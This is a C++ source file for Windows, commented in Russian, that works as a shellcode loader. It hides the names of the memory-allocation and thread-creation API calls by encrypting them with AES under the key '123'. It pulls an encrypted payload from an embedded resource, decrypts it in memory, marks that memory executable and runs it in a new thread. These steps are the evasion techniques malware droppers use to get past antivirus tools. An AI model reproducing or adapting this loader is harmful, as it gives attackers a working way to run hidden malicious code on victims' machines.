#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

#define ID_CALC_BIN "ID_CALC_BIN"

// Безопасная функция дешифрования с очисткой дескрипторов
void Decript(DWORD keyLen, char* sh, DWORD shL, unsigned char* key) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) goto cleanup;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;
    
    // ТРЕТИЙ параметр ОБЯЗАН быть TRUE для снятия PKCS7 Padding
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, TRUE, 0, (BYTE*)sh, &shL);

cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
}

typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

int main() {
    std::cout << "Hello" << std::endl;
    unsigned char k0y[] = {0x31, 0x32, 0x33}; // Пароль "123"
	
    unsigned char sVirtualAlloc[] = { 0x6d,0x3a,0x58,0xce,0x3d,0xbd,0xf9,0x29,0xb2,0x6e,0x19,0xd4,0xa4,0xa5,0x24,0x86 };
    unsigned char sVirtualProtect[] = { 0x80,0x55,0xf6,0xf9,0x71,0x70,0x57,0x05,0x7c,0x8b,0xc5,0xa3,0x78,0x95,0xea,0x65 };
    unsigned char sCreateThread[] = { 0x5d,0x8b,0x23,0x9e,0xb8,0x70,0x5b,0xb2,0xcc,0x57,0x5d,0xd8,0x23,0xd3,0xf8,0xd2 };

    Decript(sizeof(k0y), (char*)sVirtualAlloc, sizeof(sVirtualAlloc), k0y);
    Decript(sizeof(k0y), (char*)sVirtualProtect, sizeof(sVirtualProtect), k0y);
    Decript(sizeof(k0y), (char*)sCreateThread, sizeof(sCreateThread), k0y);

    std::cout << "[+] Decrypted 2: " << (char*)sVirtualProtect << std::endl;

    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    pVirtualAlloc ptrVirtualAlloc = (pVirtualAlloc)(GetProcAddress(hKernel, (LPCSTR)sVirtualAlloc));
    pVirtualProtect ptrVirtualProtect = (pVirtualProtect)(GetProcAddress(hKernel, (LPCSTR)sVirtualProtect));
    pCreateThread ptrCreateThread = (pCreateThread)(GetProcAddress(hKernel, (LPCSTR)sCreateThread));

    if (!ptrVirtualAlloc || !ptrVirtualProtect || !ptrCreateThread) {
        std::cout << "[-] GetProcAddress failed!" << std::endl;
        return 1;
    }
	
	
	HRSRC hRes = FindResourceA(NULL, ID_CALC_BIN, (LPCSTR)RT_RCDATA);
	HGLOBAL hLoad = LoadResource(NULL, hRes);
	unsigned char* ptr = (unsigned char*)LockResource(hLoad);

	DWORD size = SizeofResource(NULL, hRes);

	std::vector<unsigned char> pay(ptr, ptr + size);
	
    std::cout << "[+] API Functions resolved successfully!" << std::endl;

    unsigned char* exec_mem = (unsigned char*)ptrVirtualAlloc(NULL, pay.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) return 1;
	RtlMoveMemory(exec_mem, pay.data(), pay.size());
	
	Decript(sizeof(k0y), (char*)exec_mem, size, k0y);
    
	
    DWORD oldProtect = 0; 
    HANDLE threadHandle = NULL;

    BOOL vpResult = ptrVirtualProtect(exec_mem, pay.size(), PAGE_EXECUTE_READ, &oldProtect);

    if (vpResult != 0) {
        std::cout << "[+] Creating thread..." << std::endl;
        threadHandle = ptrCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        if (threadHandle) {
            WaitForSingleObject(threadHandle, -1);
            CloseHandle(threadHandle);
        }
    }

    return 0;
}